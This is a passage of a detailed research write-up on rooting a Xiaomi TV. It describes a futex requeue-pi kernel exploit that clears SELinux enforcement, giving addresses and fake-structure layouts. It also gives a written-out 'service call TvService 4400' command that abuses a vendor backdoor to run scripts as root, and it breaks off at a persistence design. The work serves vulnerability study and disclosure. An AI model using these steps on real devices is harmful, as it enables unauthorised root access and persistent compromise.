# GhostLock on the Xiaomi MiTV-MFTP0 (alita, MT9652, Android 9)

Technical write-up. Everything below was measured on hardware, not inferred from
patch notes. Where a claim rests on a single observation it is marked as such.

---

## 1. Scope and outcome

The goal was to obtain root on a retail Xiaomi TV running Linux 4.9.118 with
SELinux enforcing, AVB green and dm-verity on `system`/`vendor`.

Achieved:

* A working local privilege escalation from an unprivileged app context
  (`untrusted_app`) to kernel-level write access, giving a **write-zero-8-bytes to
  any physmap address** primitive.
* Using that primitive to clear `selinux_enforcing`, turning the device permissive
  without a reboot.
* A complete map of all 37 partitions, byte-verified.
* A complete reverse engineering of the vendor's unauthenticated root command
  channel (`TvService` transaction code 4400) and of a boot-time persistence path
  built on top of it.

Not achieved:

* Arbitrary write of **non-zero** data. The primitive is a NULL write only.
* A reliable single-shot exploit. Roughly one attempt in three lands; the rest are
  either silent no-ops or a watchdog reset (section 8).

Persistence (planting a library in `/data` so the device comes back as root after a
reboot) was fully designed and verified statically, then deliberately **left
unimplemented**. It is documented in section 12 as a frozen experiment.

---

## 2. Target facts

| | |
|---|---|
| Model / codename | MiTV-MFTP0 / `alita` (panel L65R8-X) |
| Build | `23.2.10.6129`, Android 9, `PPR2.180905.006.A1` |
| Fingerprint | `xiaomi/alita/alita:9/PPR2.180905.006.A1/6129:user/release-keys` |
| Build date | 2023-02-10 02:42:14 CST |
| SoC | MediaTek MT9652, platform `m7642` |
| Userspace | **armv8l, 32-bit** (`ro.product.cpu.abi=armeabi-v7a`) |
| RAM | 2.6 GB |
| Kernel | Linux 4.9.118+, built with MStar GCC 4.9.2 |
| eMMC | 61,071,360 sectors = 29,820 MB |
| `ro.secure` / `ro.debuggable` | 1 / 0 |
| `verifiedbootstate` | green |
| `veritymode` | enforcing |
| Debug access | network adb on port 5555, enabled manually from the engineering menu |

The 32-bit userspace matters: `compat_sys_futex` and `compat_restore_sigframe` take
the compat paths, with different frame sizes than the arm64 code the public exploit
was written against.

A note on the debug channel: the network debugging toggle does **not** survive a
reboot reliably. After a watchdog reset, TCP 5555 is refused until someone re-enables
it on the TV. Every retry loop in `ghost/` therefore distinguishes "device rebooted"
from "adb dropped", using `boot_id` plus `uptime`. Treating an adb disconnect as a
reboot is the fastest way to draw wrong conclusions — the exploit can be killed by
`SIGSEGV` inside its own process without the kernel ever rebooting.

---

## 3. Kernel build configuration

The full `.config` was recovered from the boot image: `boot.img` contains an
uncompressed u-boot legacy uImage (`magic 0x27051956`, `comp=0`, load/entry
`0x20280000`, name `Linux-4.9.118+`), and the uImage carries the build configuration
inline as an `IKCFG_ST` blob. Extracting it yields 5,180 lines. The values that
matter:

| Option | Value | Consequence |
|---|---|---|
| `CONFIG_RANDOMIZE_BASE` | **not set** | no KASLR at all; every kernel address is a compile-time constant |
| `CONFIG_PROC_KCORE` | not set | no `/proc/kcore`, so no way to read kernel memory directly |
| `CONFIG_KPROBES` / `KPROBE_EVENTS` | not set | no kprobe; dynamic observation limited to ftrace, which perturbs timing |
| `CONFIG_KALLSYMS_ALL` | not set | function symbols only, no data symbols |
| `CONFIG_SECURITY_SELINUX_DEVELOP` | **y** | `enforce` is writable and stays put — unusual for a release build, and the single most useful property on this device |
| `CONFIG_SLAB_FREELIST_RANDOM` | not set | heap layout is predictable |
| `CONFIG_HARDENED_USERCOPY` | y | does not affect this path |
| `CONFIG_DEBUG_RODATA` | y | read-only kernel text, but `.bss` targets are writable |
| `CONFIG_MODULES` + `CONFIG_MODVERSIONS`, no `CONFIG_MODULE_SIG` | y | **self-built .ko is not feasible**: MODVERSIONS requires the vendor's `Module.symvers` for symbol CRCs, which is not obtainable |
| `CONFIG_OVERLAY_FS` | not set | overlayfs-based persistence does not exist at the kernel level |
| `CONFIG_FUTEX` | y | the bug's precondition |

The absence of KASLR is what makes a fixed-address target like
`selinux_enforcing` viable. The absence of `PROC_KCORE` and `KPROBES` is what makes
the exploit so hard to debug: there is no way to observe the kernel state that
decides between success and silence.

---

## 4. Addresses and constants

```
KIMAGE_BASE                 0xffffff8008080000
_stext                      0xffffff8008082000
selinux_enforcing region    0xffffff8009385590   (see section 6)
rt_mutex_adjust_prio_chain  0xffffff80081228dc
rt_mutex_adjust_pi          0xffffff800812324c
__sched_setscheduler        0xffffff80080fa7cc
PAGE_OFFSET                 0xffffffc000000000
MEMSTART                    0x20200000
```

Recovering these required reconstructing the symbol table from the raw kernel image.
The device's `/proc/kallsyms` is readable but every address is zeroed
(`kptr_restrict`). `tools/kallsyms_dump.py` and `tools/symsig.py` solve this by
locating the `kallsyms_offsets[]` array — a very long strictly increasing `u32`
sequence — in the image, then aligning it entry by entry with the symbol *order*
from `/proc/kallsyms`. No token table parsing, no BTF, no relocations.

---

## 5. The bug

`futex_wait_requeue_pi` enqueues a stack-allocated `rt_waiter` on the target futex
and blocks. On the timeout path the function is supposed to tear that waiter down
via `rt_mutex_finish_proxy_lock()` / `remove_waiter()`. In this kernel it does not:

```
handle_early_requeue_pi_wakeup()
    if (!match_futex(&q.key, key2))
        return -ETIMEDOUT;          /* -> goto out_put_keys */
```

`out_put_keys` releases the keys and returns. `remove_waiter()` is never called, so
`task->pi_blocked_on` still points at the `rt_waiter` that lived in
`futex_wait_requeue_pi`'s frame — a frame that has since been popped. That is a
dangling pointer into a live kernel stack.

Separately, `futex_requeue`'s EDEADLK path only does

```
this->pi_state = NULL;
break;
```

so the pi_state is gone while the waiter chain still references it.

Now have another thread call `sched_setattr()` on the blocked task with a
`SCHED_OTHER` policy. In `__sched_setscheduler` at `+0x2c4`:

```
cbnz w26, rt_mutex_adjust_pi
```

There is no comparison against the old priority — the call is unconditional
whenever `pi == true`. `rt_mutex_adjust_pi` then reads `pi_blocked_on` and, if it is
non-NULL, walks the PI chain with `rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK,
NULL, next_lock, NULL, task)`.

Two gates decide whether anything happens at all:

```
1141  if (!waiter || (waiter->prio == task->prio && !dl_prio(task->prio)))
          return;
 611  if (waiter->prio == task->prio)  ->  requeue = false     /* skips [7] */
```

And the reason the first gate is the whole story on this device: `task->prio` is
pinned at 120 by PI inheritance (the waiter holds `f_pi_chain`, the owner is blocked
on it at prio 120). The leftover `waiter->prio` on the stack was written by
`task_blocks_on_rt_mutex` with the `task->prio` of that moment — also 120.

So an unfired exploit is not merely "no effect". It is a *clean, silent early
return*: no crash, no write, no log line, nothing. That property is what made this
port hard, and section 7 explains the instrument built to defeat it.

When the gate does open, the chain reaches `[7]`:

```
705  rt_mutex_dequeue(lock, waiter);     /* -> rb_erase_cached(&waiter->tree_entry, ...) */
707  waiter->prio = task->prio;
708  rt_mutex_enqueue(lock, waiter);
```

That `rb_erase_cached` operates on `waiter->tree_entry`, whose contents we control,
because the whole `rt_waiter` is being overwritten through the signal-frame copy
window described next.

---

## 6. The write primitive

`compat_restore_vfp_context()` copies 16 VFP registers (16 bytes each, 0x100 bytes)
from the signal frame into `[x29+0x20, x29+0x120)`. If the handler rewrites
`uc+0xF0 .. uc+0x1EF` (the VFP register area of the `ucontext_t`) and the process
returns from the signal, those 0x100 bytes land on the kernel's own call chain
stack, in the live frames of `compat_restore_sigframe` and everything above it.

That region overlaps the stack frame of `futex_wait_requeue_pi`. So the handler in
the *waiter* thread can rewrite the `rt_waiter` that is already sitting in that
same stack — as long as the write happens after the frame was popped and before the
next kernel entry clobbers it.

To make `[7]`'s `rb_erase_cached` write, we exploit case 1 of
`__rb_erase_augmented` (`rb_left == NULL`):

```
pc       = target - 8        /* parent = pc & ~3 = target-8; bit0 = 0 -> RB_RED */
rb_left  = 0                 /* selects case 1 */
rb_right = 0                 /* the value that gets written */
```

then `__rb_change_child(node, child=0, parent=target-8, root)` compares
`parent->rb_left` (at `target+8`) against `node` (a kernel stack address — never
equal), falls through to `WRITE_ONCE(parent->rb_right, 0)`, i.e. `*(target) = 0`.

Two constraints make this safe:

* `rb_right` **must** be 0. In case 1, `if (child) child->__rb_parent_color = pc;`
  would dereference whatever we supplied.
* `fake_lock->waiters_leftmost` must not equal `&waiter->tree_entry`, or
  `rb_erase_cached` calls `rb_next()` and crawls a tree we invented.

The colour bit matters as much as the pointer. An earlier version wrote
`(target-8)|1`, marking the erased node black. `____rb_erase_color` then rotated and
recoloured `.data` around `target` as if it were a real `rb_node` — the write never
landed and it panicked immediately. Writing `target-8` with bit 0 clear gives
`rebalance = NULL`, no rebalancing, and the write completes.

### Why the target is 0x590 and not 0x594

`tools/xref_page.py` scans the whole kernel `.text` for `adrp`+`ldr/str` references
into the window `[0x580, 0x5a0)` and finds 19. The layout of the three words:

```
0x...590  int    used as a boolean by selinux_ip_forward, ip_postroute,
                 socket_sock_rcv_skb, sock_rcv_skb_compat
                 (`ldr w1,[x,#0x590]; cbnz`)
0x...594  int    selinux_enforcing  (sel_read_enforce, sel_write_enforce,
                 avc_denied, enforcing_setup, ...)
0x...598  void*  file_security_cache (selinux_file_free_security:
                 `ldr x0,[x0,#0x598]; bl kmem_cache_free`)
```

The primitive writes 8 bytes. Hitting `0x594` would also clear `0x598..0x59b`,
truncating the `kmem_cache` pointer to `0xffffff80_00000000` — after which every
`close()` crashes inside `kmem_cache_free`. Hitting `0x590` covers exactly two ints
and only *reads* `0x598`, as `rb_erase`'s `parent->rb_left` comparison. It is also
8-byte aligned, so `pc = target-8` is naturally aligned with bit 0 clear.

The same alignment logic means `0x590` is the only usable target in that page; there
is no "shift by four and write a different value" option with an 8-byte `str`.

---

## 7. Making it work: geometry, timing, and instruments

### 7.1 The geometry had to be re-derived

The public exploit assumes arm64 5.x frame sizes. On 4.9 arm64 with a compat
(32-bit) caller the numbers are different, and they were verified instruction by
instruction against `vmlinux.elf` (`tools/dumpfn.py`, `tools/find_waiter.py`):

```
compat_sys_futex(0x80) -> do_futex(0x130) -> futex_wait_requeue_pi.constprop.19(0x190)
    x29 = S-0x340
    rt_waiter = x29 + 0xC8 = S-0x278
    corroborated by: +0x00fc str x22,[x29,#0xc8]        (RB_CLEAR_NODE(tree_entry))
                     +0x00ec add x4,x22,#0x18
                     +0x0100 str x4,[x29,#0xe0]         (RB_CLEAR_NODE(pi_tree))
                     +0x0104 str xzr,[x29,#0xf8]        (waiter->task = NULL)
                     q @ x29+0x118 (rt_waiter 0x170, requeue_pi_key 0x178, bitset 0x180)
                     timeout @ x29+0x80, key2 @ x29+0x68, hb @ x29+0x60, canary @ 0x188

compat_sys_rt_sigreturn(0x20) -> compat_restore_sigframe(0x40)
    -> compat_restore_vfp_context(0x230+0x20)
    x29 = S-0x2B0
    copy destination = [x29+0x20, x29+0x120) = [S-0x290, S-0x190)
```

So the copy window starts 0x18 below `rt_waiter`. If `uc+0xF0` maps to `S-0x290`,
then `rt_waiter` sits at `uc+0xF0+0x18 = uc+0x108`. That `0x108` is the single most
important constant in the exploit — and it is an offset into a `ucontext_t`, which
is exactly the kind of thing that silently differs on an undocumented build.

### 7.2 arm64 4.9 has no separate IRQ stack

This is the discovery that unlocked the port. On arm64 4.9 a timer interrupt pushes
`pt_regs` (0x110 bytes) onto the **kernel stack of the interrupted task** and then
runs driver frames below it. One tick every ~4ms is enough to overwrite the entire
`[S-0x290, S-0x190)` region.

Consequence: the spray has a shelf life of about one timer tick. Any design where
the spraying thread and the hitting thread are separated by a logging call, a
`read()` of `/proc`, or even a `usleep(1000)` will fail — not sometimes, but always.
An earlier version did exactly that:

```
waiter: raise -> spray -> g_fresh++ -> spin
main  : usleep(1000) poll -> logf() (open/write/fsync to /sdcard) -> read_prio (3 syscalls) -> nudge
```

Milliseconds of delay on the main side, against a 4ms tick. The fix is a strict
request/response handshake:

```
main  : g_req = round;  spin until g_served == g_req;  sched_setattr();  g_ack = round
waiter: spin until g_req != g_served;  raise(SIGUSR1);  g_served = my
```

Between the spray and the hit there is now one spin check and one syscall (~1µs).
Inside the critical section there is no logging, no `/proc` access, and no allocation.

### 7.3 Three instruments, because failure is invisible

Because a miss and a total no-op look identical from the outside (`120 == 120`,
clean return), three probes were added. All of them only write into the process's own
page, so they are free of kernel risk.

**fpcheck** — proves the VFP copy executes at all. Set `d0 = 0x0123456789ABCDEF`,
`raise(SIGUSR1)`, have the handler rewrite `uc+0xF0` to `0xBBBBBBBBBBBBBBBB`, read
`d0` back. `0xBBBB…` means the copy ran; `0x0123…` means
`compat_restore_sigframe`'s gate (`err != 0 || !valid_user_regs(...)`) skipped it.
The kernel copies into the same buffer that `fpsimd_update_current_state()` consumes,
so hardware `d0` faithfully reports whether the copy happened. This must be checked
per thread: the gate depends on that thread's `pstate`.

**echo** — proves the copy is *this round's*. The handler writes
`0xD00D0000|seq` into `uc+0xF0`; the waiter reads `d0` with `vstr` immediately after
`raise()` returns (still zero syscalls) and publishes it. Equality means a fresh copy
landed in this round, not a leftover from the previous one.

**scan** — finds where the copy lands. `--scan` rotates the assumed base offset
`g_ucoff` over `[0x0F8, 0x198]` in steps of 8, and `--prioonly` writes a single
qword (`121`) at candidate `base+0x40`. Since the gate is `waiter->prio != 120`,
each candidate either crashes (correct base, chain runs with the real leftover) or
does nothing (wrong base). The `[B] ucoff=...` line printed 300 rounds ahead of each
candidate names the culprit after a reset.

**fill** (`--fill`) — the safe version of the scan. Fill the entire copy window with
120 first, then overlay the ten fields at the candidate base. Theorem: for any
`base != R`, the real `waiter->prio` at `R+0x40` reads the fill value 120, equal to
`task->prio`, so the gate stays closed and the chain returns before `[3]` — no
matter how wrong `base` is. Only `base == R` overlays `R+0x40` with 121. This is what
nails `R` to a single qword without hardcoding it.

**soft** (`--soft`) — the safety net, see next section.

### 7.4 The `--soft` recipe

About one process in three has a *dangling* `pi_blocked_on`, and in that case a
partially-misaligned spray can open the gate while the chain reads a `lock` that is a
freed `pi_state`. `rt_mutex_top_waiter` then hits
`BUG_ON(w->lock != lock)` (`rtmutex49.c:703`, PC `adjust_prio_chain+0x1cc`) and the
device dies on the spot.

`--soft` pre-fills the whole copy window with a **fake lock pointer** (`v_lock`, the
address of our own fake `rt_mutex`) and then overlays only the three qwords the
primitive needs:

```
pc       = target - 8
rb_right = 0
rb_left  = 0
```

With that, a misaligned spray leaves `lock`, `prio` and `task` all pointing at the
fake lock inside our own page. The chain spins within that page and deadlocks or
returns — it no longer dereferences a freed `pi_state`. Drift degrades from "crash"
to "silence".

An earlier version overlaid all ten fields even with `--soft` and crashed the device:
`v_task` (a physmap address) landed exactly on the leftover's `lock` slot, and
`rt_mutex_top_waiter` read `leftmost = 0` and dereferenced `0x38`. Overlaying only
three qwords is the fix.

The fake page itself is a `mmap`+`mlock`ed 4 KB page whose physical address is
obtained from `/proc/<pid>/pagemap` by a root helper (`ghost/pfn.sh`, driven by
`ghost/pfnd2.sh`) and converted to a physmap address with
`PAGE_OFFSET + (phys - MEMSTART)`. Its contents:

* `fake_lock->waiters = fake_lock->waiters_leftmost = &w0.tree_entry`
* `fake_lock->owner = NULL` — so the chain returns cleanly through `[9]` right after
  the write. With a non-NULL owner it would continue into `[10]/[11]/[12]` and take
  `raw_spin_lock(fake_task->pi_lock)`, which is where the observed silent hard
  lockups came from.
* `w0.tree_entry.__rb_parent_color = 1` (RB_BLACK with a NULL parent). A red root
  would make `rb_insert_color` compute `gparent = 0` and dereference it.
* `w0.prio = 0`, higher priority than `task->prio`, so the leftover waiter never
  becomes `rt_mutex_top_waiter` and branch 1 of `[11]` — the fake red-black rotation
  under `task->pi_lock` with interrupts off — is never taken.
* `fake_task->pi_waiters` left empty, for the same reason.

---

## 8. Measured outcome distribution

Fifteen full attempts, classified from `boot_id` plus the device-side log:

| Outcome | Share | Mechanism | Cost |
|---|---|---|---|
| Silently nothing | ~2/3 | `pi_blocked_on == NULL` for this process; decided in round 0 | ~10 s, just try another process |
| Hard lockup, watchdog reset | ~1/5 | leftover is dangling but the spray did not land on `R` | ~2.5 min of reboot |
| Success | ~1/3 | dangling **and** landed | immediate |

Two operational consequences:

* `--rounds` is meaningless beyond the first round. The state that decides success is
  process-level (`pi_blocked_on` at the time of the requeue race), not round-level.
  The unit of testing must be *one process per attempt*.
* A successful run takes three attempts on average, two to four minutes, and carries
  a 30-50% chance of one watchdog reboot along the way.

The kernel gives no oops record for the lockups: `pstore` reports total 0. Detection
is therefore external only — `boot_id` changed, or `uptime` went backwards.

---

## 9. Known limits

**The NULL branch is unsolved.** Two thirds of processes have
`pi_blocked_on == NULL`, in which case `rt_mutex_adjust_pi` executes a single `cbz`
and returns. `ftrace` confirms the split precisely: `adjpi=224, chain=0` — the
function is entered 224 times and the chain walker is entered zero times. This means
the vendor modified the futex teardown so that the pointer is usually cleared, and
the original exploit's assumption ("every teardown leaves it dangling") no longer
holds. Since `PROC_KCORE` and `KPROBES` are both absent, there is no way to observe
*why* from userspace. The plausible next step is a binary diff of this kernel against
AOSP 4.9 around `futex_wait_requeue_pi`, but that requires the vendor's kernel
sources, which are not published.

**The primitive writes only eight zero bytes.** Good enough to clear
`selinux_enforcing`; not enough to patch a credential structure, a function pointer,
or a flag that must be set to a specific non-zero value. A write gadget that allows
controlled non-zero data (`rb_right != 0` currently dereferences `child` and dies) was
not found.

---

## 10. The vendor's root channel: TvService transaction 4400

`TvService.apk` (package `mitv.service`) declares
`android:sharedUserId="android.uid.system"`, so it runs as uid 1000 in
`u:r:system_app:s0`. It registers `TvService` and `TvSettingService` through
`ServiceManager.addService()` from an exported, permission-less service component
(`.TvServer`).

`TvServiceDefaultImpl.onTransact` handles a custom transaction code:

```java
case 4400:
    data.enforceInterface("mitv.internal.ITvService");   // the only "check"
    String code = data.readString();                     // e.g. "s"
    String args = data.readString();                     // e.g. "sh,/sdcard/Download/agent.sh"
    Log.d("MiTv-Service-TvService-Parent", "get misysdiagnose command, code: " + code
          + " argument=" + args);
    SystemProperties.set("vendor.misysdiagnose.cmd.arguments", args);
    SystemProperties.set("vendor.misysdiagnose.cmd.code", code);   // the trigger
```

There is no `getCallingUid()` check, no `checkCallingPermission()`, no signature
check. `enforceInterface` only validates the interface token, which is a public
string.

The other half lives in init, `/vendor/etc/init/hw/init.m7642.rc:389`:

```
on property:vendor.misysdiagnose.cmd.code=*
    exec - root root -- /vendor/bin/misysdiagnose -${vendor.misysdiagnose.cmd.code} ${vendor.misysdiagnose.cmd.arguments}
```

Setting that property therefore causes init to `exec` the vendor diagnostic binary
as **root**, with our string appended. The `-s` code path takes its argument as
`prog,arg1,arg2` (comma separated), so `code = s` and
`args = sh,/data/local/tmp/rootd.sh` gives `misysdiagnose -s sh,/data/local/tmp/rootd.sh`
— a root shell script.

Two other leads in the same APK turned out to be dead ends:
`TvServiceDefaultImpl.runSystemCommand()` (a `Runtime.exec` wrapper) has no call
sites in the dex, and `pppd_eth0` reads a world-writable
`/data/misc/ppp/options.conf` but the service is `disabled`.

---

## 11. Who can reach the backdoor

The channel exists on every unit. The SELinux rules decide who can talk to it; the
table below was read out of the compiled policy (`*.cil`, file and line references),
then **corrected by measurement** — the last row is the one that matters:

| Subject | write `vendor_default_prop` | `find` TvService | binder call -> `system_app` |
|---|---|---|---|
| `untrusted_app` | no (read only) | no | no |
| **`shell` (adb)** | no | yes (TvService is in `service_manager_type`) | **yes, measured** (section 11.1) |
| **`mediaserver`** | no | yes (`vendor:2673`) | **yes** (`plat:9335`) |
| `system_app` | **yes** (`vendor:3442`) | yes (`plat:14747`) | self |

The two rules that make `mediaserver` a pivot:

```
(allow mediaserver_28_0 system_data_file_28_0 (file (ioctl read getattr lock map
       execute execute_no_trans open)))                      vendor_sepolicy.cil:2668
(allow mediaserver binderservicedomain (binder (call transfer)))
                                                             plat_sepolicy.cil:9335
(allow system_app_28_0 vendor_default_prop_28_0 (property_service (set)))
                                                             vendor_sepolicy.cil:3442
```

`binderservicedomain` includes `system_app` (`plat_sepolicy.cil:648`), and any
attribute prefixed `vendor.` defaults to type `vendor_default_prop`
(`plat_property_contexts:148`).

### 11.1 Correction: adb shell can open the backdoor while enforcing

An earlier version of this section claimed the ordering was forced — exploit first, to
get permissive, then the backdoor. **That is wrong.** Measured on a cold boot
(watchdog reset, `enforce=1`, no agent running, `/data/misc/mitv_upgraded_libs` still
empty):

```
$ adb shell 'id; cat /sys/fs/selinux/enforce'
uid=2000(shell) ... context=u:r:shell:s0
1
$ adb shell 'service call TvService 4400 s16 s s16 sh,/sdcard/Download/agent.sh'
Result: Parcel(00000000    '....')
```

Within one second, init had executed the payload as root:

```
6368  root  u:r:misysdiagnose:s0  misysdiagnose -s sh,/sdcard/Download/agent.sh
6370  root  u:r:misysdiagnose:s0  sh /sdcard/Download/agent.sh
# /sdcard/Download/agent.log
agent up pid=6369 uid=0 Sat Nov  7 16:19:39 CST 2026
```

`enforce` was 1 before and after; the shell process has `CapEff=0`. So on this build a
console with adb reaches a root context without the exploit at all. The two are
**independent paths**, not a chain — but "root context" is not the same as "unrestricted
root", and section 11.2 quantifies how far that context actually reaches.

Note what is ours and what is the vendor's: the primitive is only "execute this script
as root". `agent.sh` (ghost/agent.sh) is this project's own polling loop over
`/sdcard/Download/cmd.sh`, written because the init `exec` is synchronous — a script
that blocks would stall init — and because the property trigger only fires on a
*change* of value. That is also why a cold boot fires on the first call (the property
is empty) while a warm device needs the code flipped to something else first.

The mechanism is now known, and it is not what the `.cil` files suggest — those files are
never read. init logs:

```
selinux : SELinux: Loaded policy from /vendor/etc/selinux/precompiled_sepolicy
SELinux : 8192 avtab hash slots, 29175 rules
SELinux : 1 users, 4 roles, 1908 types, 0 bools, 93 classes
```

It takes that path because
`/vendor/etc/selinux/precompiled_sepolicy.plat_and_mapping.sha256` matches
`/system/etc/selinux/plat_and_mapping_sepolicy.cil.sha256` (`f464a053…`) — exactly the
condition for the precompiled fast path. "No such rule in the `.cil`" therefore says
nothing about the policy that actually runs.

The earlier search was also blind by construction: there is a third text file,
`plat_pub_versioned.cil`, in which types carry a `_28_0` suffix — `shell_28_0`,
`system_app_28_0` — so a grep for `allow shell system_app` cannot match anything there.
Re-run against the versioned names, the answer is unchanged: shell's binder grants are
still only `dumpstate`, `hwservicemanager`, `storaged`, `statsd` and `surfaceflinger`,
none of them `system_app` or `system_server`.

That the permission is genuinely granted, rather than the check being skipped, was then
measured directly. A denial is audited even in permissive mode, and this device does log
such denials (six `permissive=1` entries from unrelated operations), so an absent `avc:`
line is evidence of an allow. With the policy permissive, both `service call TvService 1`
and `service call activity 1` — the latter aimed at the `system_server` domain — went
through, returned parcels, and produced **no** new `avc:` line.

So the loaded binary policy grants binder calls that the shipped text does not describe.
Reading the exact rule out of it needs `sesearch` / `secilc` (setools), which is not
installed on the host; that is the only step still open, and it is tracked in section 16.

Two consequences worth stating plainly:

* The exploit is not the key to the backdoor. Its value is a *local* privilege
  escalation with no adb in the loop, and a path that does not depend on a vendor bug.
* Because root is available from adb regardless, the physical page the `--soft` recipe
  needs (section 7.4) can always be resolved. There is no cold-boot deadlock — a
  concern that would otherwise apply, since PFN resolution needs root.

One constraint still holds: `mediaserver` cannot `exec` a shell (no `shell_exec`
allowance), which is why the persistence payload execs a *copy* of `/system/bin/service`
placed in a `system_data_file` directory rather than `/system/bin/sh`.

### 11.2 How far that root actually reaches

"Root" here is uid 0 inside `u:r:misysdiagnose:s0`, not an unrestricted root. The domain
does hold every capability this kernel defines — `CapEff = 0x3fffffffff`, `cap_last_cap = 37`,
so all 38 bits are set — but capabilities are only one of the gates, and under enforcing
the policy still bounds what the domain can touch.

The table below has two columns of evidence. The right one is the audit traffic collected
on 2026-11-07 while the policy was permissive: a denial is audited in permissive mode too,
and this device logs them, so an absent entry is evidence of an allow there. Counts are audit
*lines*; one denied access can emit two or three lines, one per permission checked, so read
them as relative weight rather than as distinct denial counts.

The middle column was originally *inferred* from those counts. That inference was wrong in
two places, so every operation was re-run with the policy enforcing, and the column now
records what the operation actually did. Where the two disagree, the measurement wins.

| Operation | Under enforcing (measured) | Permissive audit lines |
|---|---|---|
| write files under `/data` | allowed | 0 — all 18 `write` denials target `/dev/kmsg`, netlink sockets, or two directory nodes |
| `CAP_DAC_OVERRIDE` on a `system:system 0600` file | allowed — the XML header came out of `settings_system.xml` | 0 — the only capability-class denials are `net_admin` |
| read `/proc/uptime` | denied, `EACCES` | 154 |
| read `/proc/net/tcp` and `/proc/net/udp` | denied, `EACCES` | 116 |
| `AF_PACKET` sockets | not testable from this domain — see below | 66 |
| binder `call` to `system_server` | **allowed** — `service call activity 1` returns a parcel carrying `system_server`'s own `IllegalArgumentException` | 14 |
| binder `transfer` to `system_server` (handing over an fd) | **denied** — `avc { transfer } … tclass=binder`, and `cmd` reports `Failed transaction` | 43 |
| exec `/system/bin/app_process32` | denied at `getattr`, before `execve` runs | 16 |
| write `/dev/kmsg` | denied, `EACCES` | 12 |
| exec this project's own `/data/anr/sniff` | denied, `EACCES` | 4 |
| `iptables` | denied — at the raw socket, well before the capability check | 4 (`capability=12`) |
| `getenforce` | denied — `/sys/fs/selinux/enforce` is a policy object too | — |
| read another domain's `/proc/<pid>/stat` | **mixed**: `init` and `system_server` readable, HAL domains not | mixed in with the totals above |

A note on method: this kernel runs `audit_rate_limit=5` and logged `audit_lost=1006` during
the re-run, so bursts of denials get dropped. "No audit line" is therefore evidence of an
allow only in the original permissive, low-rate collection; under enforcing the classification
rests on the result of the operation, with the audit lines as corroboration.

Two rows need the correction spelled out, because the earlier reading was the intuitive one
and the intuitive one is wrong.

**Binder splits in two, and the split is fd-shaped.** A `call` — no file descriptor, just
data — reaches `system_server` and comes back with that process's own exception, so the IPC
path is open. A `transfer`, which is what handing a file descriptor to another domain is
called, is refused: `avc: denied { transfer } … scontext=u:r:misysdiagnose:s0
tcontext=u:r:system_server:s0 tclass=binder`.

That distinction is the whole story of the `cmd` family. `/system/bin/cmd` is a 45 KB native
binary, and `settings`, `am` and `pm` are shell scripts wrapping it. Every one of them ends up
calling a service's `shellCommand`, which marshals three descriptors — stdin, stdout, stderr —
into the parcel. So they die at the transfer, reporting `Failure calling service activity:
Failed transaction`, not at any exec of `app_process`. A first version of this section blamed
`app_process`; that was wrong, and the control run shows why: the identical command issued
from the adb shell, uid 2000, returns `0`. **The root context is strictly worse than the
shell here**, which is worth knowing before reaching for either.

What remains true from the earlier reading is only the narrow point: `service call`, which
passes no descriptor, works from this domain — which is why `TvService 4400` has always been
reachable and why rebuilding the agent at section 11.1 never needed permissive first.

**Cross-domain `/proc` is decided per target, not by the act of crossing.** `init`'s and
`system_server`'s `stat` and `maps` both read fine from this domain; the HAL domains
(`hal_neuradio`, `hal_graphics`) do not, which is why `ps -A` emits a stream of `getattr` and
`search` denials for those PIDs. Any statement of the form "cannot walk other processes" is
too strong — it can walk some of them.

`AF_PACKET` cannot be re-tested, and the reason is itself a result: opening a packet socket
needs a binary this project controls, and executing one from `/data/anr` is the very thing the
row above refuses (`anr_data_file` carries no `execute`). The single direct evidence remains
the permissive-era `packet_socket` lines; the nearest corroboration is that the raw socket
path is shut as well — `ping` fails at `sendto` with `setopt`/`write` denials on `rawip_socket`.

Four things follow.

First, the practical statement is: **with adb alone on an enforcing unit you get a uid-0
script runner that can read and write `/data`, override file permissions, and make binder
calls — and very little else.** Packet capture, a global view of `/proc`, writing the kernel
log, changing firewall rules and running its own tools out of `/data/anr` all still need
permissive first. That is what the exploit buys on this build — not access, but reach.

Second, what the missing reach costs is best seen through the `cmd` family. Everything the
`cmd` binary can do — `cmd activity`, `cmd package`, `cmd appops`, `cmd settings`, and the
`am`/`pm`/`settings` scripts that wrap it — is one `binder transfer` away, and that transfer
is the one thing this domain cannot do. Under the policy here, uid 0 buys file-permission
override and the init exec channel, not a wider command surface; the adb shell has the wider
command surface and a much narrower uid. Neither one alone is the union of the two.

Third, capability checks are themselves SELinux-hooked, but they are not always the first wall.
`CapEff` having a bit set is not sufficient under enforcing; the domain also needs
`allow <domain> self:capability <perm>`. In the permissive log `CAP_NET_ADMIN` was refused as
`capability=12` — the bit is present and the policy says no. Under enforcing, `iptables` never
reaches that check: it dies earlier, at `getopt` on `rawip_socket` and at reads of
`/proc/self/net/ip_tables_names`. "38 capabilities" describes the mask, not the grant, and the
first denial in a chain is not necessarily the one the policy is actually about.

Fourth, writability of the system partitions is a separate axis that none of the above
decides:

| Target | Result |
|---|---|
| `/` (= `system`, `dm-0`) | `mount -o remount,rw /` refused: `'/dev/root' is read-only` |
| `/vendor` (`dm-1`) | remount rw is *accepted* at the VFS layer, then every write fails in the block layer with `Buffer I/O error on dev dm-1 … lost async page write`; a later `remount,ro` also fails with `EIO` until reboot |
| `mmcblk0p30` (`system`, raw) | `ro=0`, writable with `dd` — which destroys the verity hash tree and fails verification on the next boot |
| `mmcblk0p32` (`vendor`, raw) | `ro=1` |
| `/vendor/tvconfig`, `/vendor/tvcertificate` | separate rw partitions nested inside the ro `/vendor`; writable |

So the channel cannot modify `system` or `vendor` in place. That is consistent with section
12: persistence needs a Recovery detour, not a clever command.

An independent writeup reaches the same conclusion on a sibling model — `MiTV-ASTP0` /
`mulan` / L75MA-AC, Android 9, build 2.10.3982 —
<https://i95.me/mitv-magisk-root-tutorial> (2026-07-21, mirrored at ZNDS `tv-1272142`).
It documents the same `service call TvService 4400 s16 s s16 <script>` entry, states that
the elevation happens in the binder server rather than in the adb shell process, and warns
that uid 0 there does not imply the ability to remount partitions or write `/vendor`,
`/odm`, `boot` or `vbmeta`. It also notes that the domain was never shown to hold the mount
and boot-chain permissions persistence would need, and installs Magisk through
UART/Recovery instead.

---

## 12. Persistence: designed, verified, frozen

This was fully worked out and then deliberately not deployed. It is documented
because the analysis is the interesting part, and because the rescue path matters
more than the attack.

```
boot -> mediaserver (media, u:r:mediaserver:s0)
  -> libmiplayeradapter.so dlopen /data/misc/mitv_upgraded_libs/libmiffmpeg.so
       ld.config.28.txt: namespace.default.permitted.paths += /data        OK
